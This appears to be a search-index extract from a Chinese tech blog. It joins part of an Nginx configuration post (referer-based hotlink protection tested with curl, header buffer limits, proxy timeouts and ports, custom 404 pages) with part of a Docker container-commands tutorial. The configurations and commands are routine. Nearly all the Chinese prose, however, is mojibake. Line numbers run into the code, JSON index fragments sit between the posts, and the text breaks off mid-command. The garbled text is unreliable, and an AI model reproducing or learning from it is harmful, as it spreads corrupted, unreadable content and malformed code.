æŒ‡ä»¤å®ç°é˜²ç›—é“¾è¯­æ³•è¯´æ˜12345678910è¯­æ³•: valid_referers none | blocked | server_names | string â€¦;é…ç½®æ®µ: server, locationæŒ‡å®šåˆæ³•çš„æ¥æº\'referer\', ä»–å†³å®šäº†å†…ç½®å˜é‡$invalid_refererçš„å€¼ï¼Œå¦‚æœrefererå¤´éƒ¨åŒ…å«åœ¨è¿™ä¸ªåˆæ³•ç½‘å€åˆ—è¡¨ä¸­ï¼Œè¿™ä¸ªå˜é‡è¢«è®¾ç½®ä¸º0ï¼Œå¦åˆ™è®¾ç½®ä¸º1. ä¸åŒºåˆ†å¤§å°å†™ã€‚å‚æ•°è¯´æ˜ï¼šnone "Referer" ä¸ºç©ºblocked "Referer"ä¸ä¸ºç©ºï¼Œä½†æ˜¯é‡Œé¢çš„å€¼è¢«ä»£ç†æˆ–è€…é˜²ç«å¢™åˆ é™¤äº†ï¼Œè¿™äº›å€¼éƒ½ä¸ä»¥http://æˆ–è€…https://å¼€å¤´ï¼Œè€Œæ˜¯"Referer: XXXXXXX"è¿™ç§å½¢å¼server_names "Referer"æ¥æºå¤´éƒ¨åŒ…å«å½“å‰çš„server_namesï¼ˆå½“å‰åŸŸåï¼‰arbitrary string ä»»æ„å­—ç¬¦ä¸²,å®šä¹‰æœåŠ¡å™¨åæˆ–è€…å¯é€‰çš„URIå‰ç¼€.ä¸»æœºåå¯ä»¥ä½¿ç”¨*å¼€å¤´æˆ–è€…ç»“å°¾ï¼Œåœ¨æ£€æµ‹æ¥æºå¤´éƒ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¥æºåŸŸåä¸­çš„ä¸»æœºç«¯å£å°†ä¼šè¢«å¿½ç•¥æ‰regular expression æ­£åˆ™è¡¨è¾¾å¼,~è¡¨ç¤ºæ’é™¤https://æˆ–http://å¼€å¤´çš„å­—ç¬¦ä¸². ä¸¤ç§é…ç½®æ¡ˆä¾‹123456789101112# é…ç½®æ¡ˆä¾‹ä¸€ï¼šé™åˆ¶æ¥æºåªèƒ½æ˜¯noneã€blockedã€ä¸»æœºåŸŸåã€ç™¾åº¦ã€è°·æ­Œã€å¿…åº”location ~* \\.(gif|jpg|png|webp)$ { valid_referers none blocked *.baidu.com *.google.com *.bing.com server_names ~\\.baidu\\. ~\\.google\\. ~\\.bing\\.; if ($invalid_referer) { return 403; } root /opt/www/image;} 12345678910111213# é…ç½®æ¡ˆä¾‹äºŒï¼šå±è”½æ‰€æœ‰æ¥è‡ªæŒ‡å®šåŸŸåï¼ˆä¾‹å¦‚æœç‹—ï¼‰çš„è®¿é—®location ~* \\.(gif|jpg|png|webp)$ { valid_referers sogou.com *.sogou.com ~\\.sogou\\.; # æ­¤å¤„å¿…é¡»æ˜¯åŒ¹é…ç©ºå­—ç¬¦ä¸² if ($invalid_referer = \'\'){ return 403; } root /opt/www/image;} æµ‹è¯•é…ç½®æ˜¯å¦ç”Ÿæ•ˆ123456789101112131415161718192021222324252627282930313233343536# é€šè¿‡curlå‘½ä»¤æµ‹è¯•é…ç½®æ˜¯å¦ç”Ÿæ•ˆï¼Œå¼ºçƒˆå»ºè®®é¢å¤–æµ‹è¯•refererå­—æ®µä¸ºç©ºå­—ç¬¦ä¸²æˆ–è€…æ— æ­¤å­—æ®µçš„è¯·æ±‚$ curl -v -k -I --referer https://www.sogou.com https://example.com* About to connect() to www.example.com port 443 (#0)* Trying www.example.com...* Connected to www.example.com (14.215.177.38) port 443 (#0)* Initializing NSS with certpath: sql:/etc/pki/nssdb* skipping SSL peer certificate verification* SSL connection using TLS_RSA_WITH_AES_256_CBC_SHA256* Server certificate:* subject: CN=www.example.cn* start date: 3æœˆ 19 00:00:00 2019 GMT* expire date: 3æœˆ 18 12:00:00 2020 GMT* common name: www.example.cn* issuer: CN=TrustAsia TLS RSA CA,OU=Domain Validated SSL,O="TrustAsia Technologies, Inc.",C=CN&gt; HEAD / HTTP/1.1&gt; User-Agent: curl/7.29.0&gt; Host: www.example.com&gt; Accept: */*&gt; Referer: https://www.sogou.com&gt;&lt; HTTP/1.1 403 ForbiddenHTTP/1.1 403 Forbidden&lt; Server: Nginx/2.2.3Server: Nginx/2.2.3&lt; Date: Thu, 02 Jan 2020 23:38:13 GMTDate: Thu, 02 Jan 2020 23:38:13 GMT&lt; Content-Type: text/htmlContent-Type: text/html&lt; Content-Length: 612Content-Length: 612&lt; Connection: keep-aliveConnection: keep-alive&lt;* Connection #0 to host www.example.com left intact Nginx æ”¾å®½ GET è¯·æ±‚ä¸­ URL çš„æœ€å¤§é•¿åº¦é™åˆ¶ client_header_buffer_size çš„é»˜è®¤å€¼ï¼š client_header_buffer_size 1k large_client_header_buffers çš„é»˜è®¤å€¼ï¼š large_client_header_buffers 4 4k 123456789http { include mime.types; default_type application/octet-stream; client_header_buffer_size 512k; large_client_header_buffers 4 1m; ...} Nginx åå‘ä»£ç†å“åº”è¶…æ—¶è§£å†³æ–¹æ¡ˆNginx è®¿é—®å‡ºç° 504 Gateway Time-outï¼Œè¿™ä¸€èˆ¬æ˜¯ç”±äºç¨‹åºæ‰§è¡Œæ—¶é—´è¿‡é•¿å¯¼è‡´å“åº”è¶…æ—¶ï¼Œä¾‹å¦‚ç¨‹åºéœ€è¦æ‰§è¡Œ 90 ç§’ï¼Œè€Œ Nginx æœ€å¤§å“åº”ç­‰å¾…æ—¶é—´ä¸º 30 ç§’ï¼Œè¿™æ ·å°±ä¼šå‡ºç°è¶…æ—¶ã€‚ 12345location / { proxy_connect_timeout 1800s; #Nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶) proxy_send_timeout 1800s; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶) proxy_read_timeout 1800s; #è¿æ¥æˆåŠŸåï¼Œåç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶)} Nginx åå‘ä»£ç†è®¾ç½®å“åº”ç«¯å£Nginx é»˜è®¤åå‘ä»£ç†åçš„ç«¯å£ä¸º 80ï¼Œå› æ­¤å­˜åœ¨å–è¢«ä»£ç†åçš„ç«¯å£ä¸º 80 çš„é—®é¢˜ï¼Œè¿™å°±å¯èƒ½ä¼šå¯¼è‡´ä¸šåŠ¡é€»è¾‘å‡ºé”™ï¼›ä¸»è¦åŸå› æ˜¯åœ¨ Nginx çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œ é…ç½® Host å±æ€§æ—¶æ²¡æœ‰è®¾ç½®å“åº”çš„ç«¯å£ã€‚ 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} åœ¨å¦‚ä¸Šçš„é…ç½®å†…å®¹ä¸­ï¼ŒHost å±æ€§åªé…ç½®äº† $hostï¼Œæ²¡æœ‰å¯¹åº”çš„ portï¼Œè¿™å°±å¯¼è‡´åœ¨è¢«ä»£ç†çš„åœ°æ–¹å–å¾—é”™è¯¯çš„ç«¯å£ï¼Œä»¥ Java ä»£ç ä¸ºä¾‹ï¼š 1234String scheme = httpRequest.getScheme();String serverName = httpRequest.getServerName();int port = httpRequest.getServerPort();String requestURI = scheme+"://"+serverName+":"+port+"/ime-server/rest/"+serviceName+"/wmts"; è¿™æ—¶ï¼ŒJava ä»£ç å–å¾—çš„ port ä¸º 80ï¼Œå³ä½¿ Nginx ç›‘å¬çš„ç«¯å£ä¸º 8080ã€‚æ­¤æ—¶éœ€è¦ä¿®æ”¹ Nginx çš„é…ç½®æ–‡ä»¶ï¼Œå°† Host å±æ€§åé¢çš„é…ç½®å†…å®¹æ”¹ä¸º $host:$server_portï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} Nginx åå‘ä»£ç†æŒ‡å®š 404 é¡µé¢Nginx é…ç½®äº†åå‘ä»£ç†åï¼Œè‹¥å¸Œæœ›ç»Ÿä¸€æŒ‡å®šåå‘ä»£ç†åçš„ 404 é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨ proxy_intercept_errors å’Œ error_page æŒ‡ä»¤å®ç°ï¼Œæ›´å¤šå†…å®¹å¯å‚è€ƒè¿™é‡Œã€‚ 1234567891011121314151617181920212223http { proxy_intercept_errors on; error_page 404 /404.html # æˆ–è€… # error_page 404 http://cloud.example.com; upstream www.example.com { server localhost:8080; } server { listen 80; server_name www.example.com; location / { proxy_pass http://www.example.com; index index.html index.htm; } }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"webæœåŠ¡å™¨"},{title:"Docker ä¹‹ä¸‰ Docker å®¹å™¨ç®¡ç†å‘½ä»¤",url:"/posts/99d66af5.html",text:'Docker æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨1234567891011121314151617# è¯­æ³•# docker run [OPTIONS] IMAGE [COMMAND] [ARG...]# æ–°å»ºå¹¶ä»¥äº¤äº’å¼å¯åŠ¨centoså®¹å™¨ï¼Œå¹¶ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼ŒåŒæ—¶æŒ‡å®šå®¹å™¨åç§°# docker run -it --name="centos" centos /bin/bash# æ–°å»ºå¹¶åå°å¯åŠ¨centoså®¹å™¨ï¼Œå¦‚æœå¯åŠ¨åçš„å®¹å™¨å†…éƒ¨æ²¡æœ‰å‰å°è¿è¡Œçš„è¿›ç¨‹ï¼Œå®¹å™¨é»˜è®¤ä¼šé©¬ä¸Šåœæ­¢# docker run -d centos# å‚æ•°OPTIONS# --name="new-name" æˆ–è€… --name new-nameï¼šä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼Œè¯¥åç§°ä¼šåœ¨æ‰§è¡Œ"docker ps"çš„æ—¶å€™æ˜¾ç¤ºå‡ºæ¥# -dï¼šåå°å¯åŠ¨å®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼Œå³å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨# -iï¼šä»¥äº¤äº’å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸-tåŒæ—¶ä½¿ç”¨# -tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸-iåŒæ—¶ä½¿ç”¨# -Pï¼šéšæœºç«¯å£æ˜ å°„# -pï¼šæŒ‡å®šç«¯å£æ˜ å°„ï¼Œæœ‰å››ç§æ ¼å¼ï¼šip:hostport:containerportã€ip::containerportã€hostport:containerportã€containerport# --privileged=trueï¼šä½¿ç”¨è¯¥å‚æ•°æŒ‡å®šå®¹å™¨å†…çš„rootæ‹¥æœ‰çœŸæ­£çš„rootæƒé™ï¼Œfalseä»£è¡¨å®¹å™¨å†…çš„rootåªæ‹¥æœ‰å¤–éƒ¨å®¿ä¸»æœºçš„ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™ Docker å®¹å™¨çš„é‡å¯ç­–ç•¥123456789101112131415# --restart=noï¼šè¡¨ç¤ºå½“å®¹å™¨é€€å‡ºæ—¶ä¸è¦è‡ªåŠ¨é‡å¯ï¼Œnoæ˜¯é»˜è®¤å€¼# --restart=alwaysï¼šè¡¨ç¤ºä¸ç®¡å®¹å™¨ä»¥ä»€ä¹ˆé€€å‡ºçŠ¶æ€ç é€€å‡ºï¼Œæ€»æ˜¯å°è¯•é‡å¯å®¹å™¨# --restart=on-failure:5ï¼šè¡¨ç¤ºå½“å®¹å™¨ä»¥é0é€€å‡ºçŠ¶æ€ç é€€å‡ºæ—¶å°è¯•é‡å¯å®¹å™¨ï¼Œä¸”æœ€å¤§å°è¯•é‡å¯æ¬¡æ•°ä¸º5# --restart=unless-stopped â€“ è¡¨ç¤ºä¸ç®¡å®¹å™¨ä»¥ä»€ä¹ˆé€€å‡ºçŠ¶æ€ç é€€å‡ºï¼Œæ€»æ˜¯å°è¯•é‡å¯å®¹å™¨ï¼›ä¸è¿‡å½“daemonå¯åŠ¨æ—¶ï¼Œå¦‚æœå‘ç°å®¹å™¨ä¹‹å‰å·²ç»å¤„äºé€€å‡ºçŠ¶æ€ï¼Œåˆ™ä¸ä¼šå°è¯•å¯åŠ¨å®¹å™¨# è®¾ç½®å®¹å™¨é‡å¯ç­–ç•¥ä¸ºon-failureï¼Œä¸”æœ€å¤§å°è¯•é‡å¯æ¬¡æ•°ä¸º5# docker run -it --restart=on-failure:5 --name="centos" centos /bin/bash# è·å–å®¹å™¨çš„é‡å¯æ¬¡æ•°# docker inspect -f "{{ .RestartCount }}" centos0# è·å–å®¹å™¨ä¸Šä¸€æ¬¡é‡å¯çš„æ—¶é—´# docker inspect -f "{{ .State.StartedAt }}" centos2019-01-27T03:54:44.510836372Z Docker åˆ—å‡ºå½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨123456789101112131415161718# è¯­æ³•# docker ps [OPTIONS]# æ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES04c9fdf618f6 1e1148e4cc2c "/bin/bash" 5 minutes ago Up 4 minutes hardcore_leavitt# æ›´æ”¹å®¹å™¨åç§°# docker rename old_container_name new_container_name# å‚æ•°OPTIONS# -aï¼šæ˜¾ç¤ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼ŒåŒ…æ‹¬å†å²ä¸Šè¿è¡Œè¿‡çš„# -lï¼šæ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨# -nï¼šåˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„nä¸ªå®¹å™¨ï¼Œä¾‹å¦‚â€œ-n 5â€# -sï¼šæ˜¾ç¤ºæ€»çš„æ–‡ä»¶å¤§å°# -qï¼šé™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ç¼–å·# --no-truncï¼šä¸æˆªæ–­è¾“å‡º Docker æ–­å¼€ä¸å½“å‰å®¹å™¨çš„è¿æ¥12345678# å½“ä»¥äº¤äº’å¼å¯åŠ¨å®¹å™¨æ—¶ï¼Œå®¹å™¨åœæ­¢ï¼Œæ–­å¼€è¿æ¥# exit# å½“ä»¥äº¤äº’å¼å¯åŠ¨å®¹å™¨æ—¶ï¼Œå®¹å™¨ä¸åœæ­¢ï¼Œæ–­å¼€è¿æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹ç»„åˆå¿«æ·é”®ctrl + p + q# å½“ä»¥åå°æ–¹å¼å¯åŠ¨å®¹å™¨æ—¶ï¼Œç›´æ¥æ–­å¼€è¿æ¥å³å¯ï¼Œå®¹å™¨é»˜è®¤ä¸ä¼šåœæ­¢# exit Docker åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤12345678910111213141516# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker exec [OPTIONS] CONTAINER COMMAND [ARG...]# åœ¨IDä¸º1a3941b6ae8eçš„å®¹å™¨ä¸­ï¼Œå¼€å¯ä¸€ä¸ªäº¤äº’æ¨¡å¼çš„ä¼ªè¾“å…¥ç»ˆç«¯# docker exec -it 1a3941b6ae8e /bin/bash# åœ¨IDä¸º1a3941b6ae8eçš„å®¹å™¨ä¸­ï¼Œä»¥äº¤äº’æ¨¡å¼æ‰§è¡Œå®¹å™¨å†…çš„/root/monitor.shè„šæœ¬# docker exec -it 1a3941b6ae8e /bin/bash /root/monitor.sh# åœ¨IDä¸º1a3941b6ae8eçš„å®¹å™¨ä¸­ï¼Œæ‰§è¡ŒæŸ¥è¯¢ç³»ç»Ÿæ—¶é—´çš„å‘½ä»¤# docker exec -t 1a3941b6ae8e date# å‚æ•°OPTIONS# -dï¼šå®ˆæŠ¤å¼è¿è¡Œï¼Œå³åœ¨åå°è¿è¡Œ# -iï¼šä»¥äº¤äº’å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸-tåŒæ—¶ä½¿ç”¨# -tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸-iåŒæ—¶ä½¿ç”¨ Docker è¿æ¥åˆ°æ­£åœ¨è¿è¡Œçš„å®¹å™¨1234567891011# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker attach [OPTIONS] CONTAINER# è¿æ¥åˆ°IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker attach 1a3941b6ae8e# æˆ–è€…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œåœ¨IDä¸º1a3941b6ae8eçš„å®¹å™¨ä¸­ï¼Œå¼€å¯ä¸€ä¸ªäº¤äº’æ¨¡å¼çš„ä¼ªè¾“å…¥ç»ˆç«¯ï¼ˆæ¨èæ­¤æ–¹å¼ï¼‰# docker exec -it 1a3941b6ae8e /bin/bash# å‚æ•°OPTIONS# --sig-proxy=falseï¼šç¡®ä¿CTRL-Dæˆ–CTRL-Cä¸ä¼šå…³é—­å®¹å™¨ Docker å¯åŠ¨ã€é‡å¯ã€åœæ­¢ã€å¼ºåˆ¶åœæ­¢å®¹å™¨1234567891011121314151617# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker start [OPTIONS] CONTAINER [CONTAINER...]# docker restart [OPTIONS] CONTAINER [CONTAINER...]# docker stop [OPTIONS] CONTAINER [CONTAINER...]# docker kill [OPTIONS] CONTAINER [CONTAINER...]# å¯åŠ¨IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker start 1a3941b6ae8e# é‡å¯IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker restart 1a3941b6ae8e# åœæ­¢IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker stop 1a3941b6ae8e# å¼ºåˆ¶åœæ­¢IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker kill 1a3941b6ae8e Docker åˆ é™¤å®¹å™¨12345678910111213141516171819# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker rm [OPTIONS] CONTAINER [CONTAINER...]# åˆ é™¤IDä¸º1a3941b6ae8eçš„å®¹å™¨# docker rm 1a3941b6ae8e# å¼ºåˆ¶åˆ é™¤IDä¸º1a3941b6ae8eçš„å®¹å™¨ï¼Œå³ä½¿å®¹å™¨æ­£åœ¨è¿è¡Œ# docker rm -f 1a3941b6ae8e# æ‰¹é‡åˆ é™¤å®¹å™¨ï¼Œç¬¬ä¸€ç§å†™æ³•# docker rm $(docker ps -aq)# æ‰¹é‡åˆ é™¤å®¹å™¨ï¼Œç¬¬äºŒç§å†™æ³•# docker ps -aq | xargs docker rm# å‚æ•°OPTIONS# -fï¼šé€šè¿‡SIGKILLä¿¡å·å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨# -lï¼šç§»é™¤å®¹å™¨é—´çš„ç½‘ç»œè¿æ¥ï¼Œè€Œéå®¹å™¨æœ¬èº«# -vï¼šåˆ é™¤ä¸å®¹å™¨å…³è”çš„å· Docker æ˜¾ç¤ºå®¹å™¨å†…éƒ¨çš„æ—¥å¿—ä¿¡æ¯123456789101112131415161718# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker logs [OPTIONS] CONTAINER# æ˜¾ç¤ºIDä¸º1a3941b6ae8eçš„å®¹å™¨çš„å†…éƒ¨æ—¥å¿—ä¿¡æ¯# docker logs 1a3941b6ae8e# è·Ÿè¸ªæ˜¾ç¤ºIDä¸º1a3941b6ae8eçš„å®¹å™¨çš„å†…éƒ¨æ—¥å¿—ä¿¡æ¯# docker logs -t -f --tail 5 1a3941b6ae8e# åœæ­¢æ—¥å¿—è¾“å‡ºï¼Œä½¿ç”¨ä»¥ä¸‹ç»„åˆå¿«æ·é”®ctrl + c# å‚æ•°OPTIONS# -tï¼šåŠ å…¥æ—¶é—´æˆ³# -fï¼šè·Ÿè¸ªæœ€æ–°çš„æ—¥å¿—æ‰“å°# --sinceï¼šæ˜¾ç¤ºæŸä¸ªå¼€å§‹æ—¶é—´çš„æ‰€æœ‰æ—¥å¿—# --untilï¼šæ˜¾ç¤ºæŸä¸ªç»“æŸæ—¶é—´ä¹‹å‰çš„æ‰€æœ‰æ—¥å¿—# --tailï¼šä»…åˆ—å‡ºæœ€æ–°çš„Næ¡æ—¥å¿—ï¼Œä¾‹å¦‚ --tail 5 Docker æ˜¾ç¤ºå®¹å™¨å†…éƒ¨è¿è¡Œçš„è¿›ç¨‹12345# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker top CONTAINER [ps OPTIONS]# æ˜¾ç¤ºIDä¸º1a3941b6ae8eçš„å®¹å™¨çš„å†…éƒ¨è¿›ç¨‹# docker top 1a3941b6ae8e Docker å®¹å™¨ä¸å®¿ä¸»æœºäº’ç›¸æ‹·è´æ–‡ä»¶12345678910# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-# docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH# ä»IDä¸º1a3941b6ae8eçš„å®¹å™¨ä¸­ï¼Œæ‹·è´æ–‡ä»¶/root/anaconda-ks.cfgåˆ°å®¿ä¸»æœºçš„/rootç›®å½•ä¸‹# docker cp 1a3941b6ae8e:/root/anaconda-ks.cfg /root# å°†å®¿ä¸»æœºçš„/root/monitor.logæ–‡ä»¶ï¼Œæ‹·è´åˆ°IDä¸º1a3941b6ae8eçš„å®¹å™¨çš„/rootç›®å½•ä¸‹# docker cp /root/monitor.log 1a3941b6ae8e:/root Docker æ˜¾ç¤ºå®¹å™¨çš„å†…éƒ¨ç»†èŠ‚12345678910# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker inspect [OPTIONS] NAME|ID [NAME|ID...]# æ˜¾ç¤ºIDä¸º1a3941b6ae8eçš„å®¹å™¨çš„å†…éƒ¨ç»†èŠ‚# docker inspect 1a3941b6ae8e# å‚æ•°OPTIONS# -fï¼šæŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶# -sï¼šæ˜¾ç¤ºæ€»çš„æ–‡ä»¶å¤§å°# --typeï¼šè¿”å›æŒ‡å®šç±»å‹çš„JSON Docker æ–°å»ºå¹¶å¯åŠ¨ Tomcat å®¹å™¨1234567891011121314151617181920# ä¸‹è½½æœ€æ–°çš„Tomcaté•œåƒï¼ˆå¯èƒ½åŸºäºDebian/Alpine/Centosã€ä¾èµ–OpenJDKï¼‰# docker pull tomcat# å‰å°æ–¹å¼æ–°å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼ŒæŒ‡å®šæ˜ å°„ç«¯å£# docker run -it -p 8888:8080 --name="tomcat8.5" tomcat# å‰å°æ–¹å¼æ–°å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼Œéšæœºæ˜ å°„ç«¯å£# docker run -it -P --name="tomcat8.5" tomcat# å‰å°æ–¹å¼æ–°å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·é”®æ–­å¼€è¿æ¥ï¼Œä¸åœæ­¢Tomcatå®¹å™¨ctrl + p + q# åå°æ–¹å¼æ–°å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼ŒæŒ‡å®šæ˜ å°„ç«¯å£# docker run -d -p 8888:8080 --name="tomcat8.5" tomcat# åå°æ–¹å¼æ–°å»ºå¹¶å¯åŠ¨Tomcatå®¹å™¨ï¼Œéšæœºæ˜ å°„ç«¯å£# docker run -d -P --name="tomcat8.5" tomcat# æ— è®ºå‰å°è¿˜æ˜¯åå°æ–¹å¼å¯åŠ¨Tomcatå®¹å™¨ï¼Œéƒ½å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿æ¥åˆ°Tomcatå®¹å™¨ï¼Œè¿›ä¸€æ­¥é…ç½®TomcatæœåŠ¡å™¨# docker exec -it tomcat8.5 /bin/bash Docker æäº¤å®¹å™¨å‰¯æœ¬ï¼Œç”Ÿæˆæ–°çš„ Docker é•œåƒ12345678910111213141516# è¯­æ³•ï¼Œå‚æ•°CONTAINERå€¼å¯ä»¥æ˜¯å®¹å™¨IDæˆ–è€…å®¹å™¨åç§°# docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]# æäº¤å®¹å™¨å‰¯æœ¬ä½œä¸ºä¸€ä¸ªæ–°çš„é•œåƒ# docker commit -a "peter@163.com" -m "first commit" 1a3941b6ae8e peter/mytomcat:8.5# æŸ¥çœ‹åˆšåˆ›å»ºçš„æ–°é•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/mytomcat 8.5 1ca4c9763049 16 seconds ago 475MB# å‚æ•°OPTIONS# -aï¼šæäº¤é•œåƒçš„ä½œè€…# -cï¼šä½¿ç”¨DockerfileæŒ‡ä»¤æ¥åˆ›å»ºé•œåƒ# -mï¼šæäº¤æ—¶çš„è¯´æ˜æ–‡å­—# -pï¼šåœ¨commitçš„æ—¶å€™æš‚åœå®¹å™¨ï¼Œé»˜è®¤é€‰é¡¹ Docker æ–°å»ºå¹¶åå°å¯åŠ¨å®¹å™¨çš„ä»‹ç»ä¸€. Docker æ–°å»ºå¹¶åå°å¯åŠ¨å®¹å™¨ï¼ˆâ€œdocker run -d xxxxâ€ï¼‰ï¼Œç„¶åé€šè¿‡å‘½ä»¤â€docker ps -aâ€ è¿›è¡ŒæŸ¥çœ‹ï¼Œä¼šå‘ç°å®¹å™¨å·²ç»é€€å‡ºï¼›è¿™é‡Œå¿…é¡»æ³¨æ„çš„æ˜¯ï¼ŒDocker å®¹å™¨åå°å¯åŠ¨ä¹‹åï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ã€‚å®¹å™¨å¯åŠ¨çš„å‘½ä»¤ï¼Œå¦‚æœä¸æ˜¯é‚£äº›ä¸€ç›´æŒ‚å™¨èµ·çš„å‘½ä»¤ï¼ˆtopã€tailï¼‰ï¼Œé»˜è®¤å°±æ˜¯ä¼šè‡ªåŠ¨åœæ­¢ã€‚ äºŒã€‚ä»¥ Nginx ä¸ºä¾‹ï¼Œæ­£å¸¸æƒ…å†µä¸‹é…ç½®å¯åŠ¨æœåŠ¡åªéœ€è¦å¯åŠ¨ç›¸åº”çš„ Service å³å¯ï¼Œä¾‹å¦‚æ‰§è¡Œå‘½ä»¤â€systemctl start nginxâ€ã€‚ä½†æ˜¯è¿™æ ·åšï¼ŒNginx å¦‚æœä»¥åå°è¿›ç¨‹æ¨¡å¼è¿è¡Œï¼Œä¼šå¯¼è‡´ Docker å‰å°æ²¡æœ‰è¿è¡Œçš„åº”ç”¨ï¼›è¿™æ ·çš„å®¹å™¨åœ¨åå°å¯åŠ¨åï¼Œä¼šç«‹å³è‡ªæ€ï¼Œå› ä¸ºå®¹å™¨è§‰å¾—è‡ªèº«æ²¡äº‹å¯åšäº†ï¼›è¿™ä¸€ç‚¹ä¸ Supervistor é…ç½®ç¨‹åºåå°è¿è¡Œå¾ˆç›¸ä¼¼ã€‚æ‰€ä»¥ï¼Œæœ€ä½³çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†éœ€è¦è¿è¡Œçš„ç¨‹åºä»¥å‰å°è¿›ç¨‹çš„å½¢å¼è¿è¡Œã€‚ ä¸‰ã€‚å®è·µæ“ä½œ 12345678910111213141516# æ–°å»ºå¹¶åå°å¯åŠ¨centoså®¹å™¨ï¼Œå¹¶åœ¨å‰å°æ‰§è¡ŒæŒ‡å®šçš„shellè„šæœ¬# docker run -d centos /bin/sh -c "while true;do echo hello docker;sleep 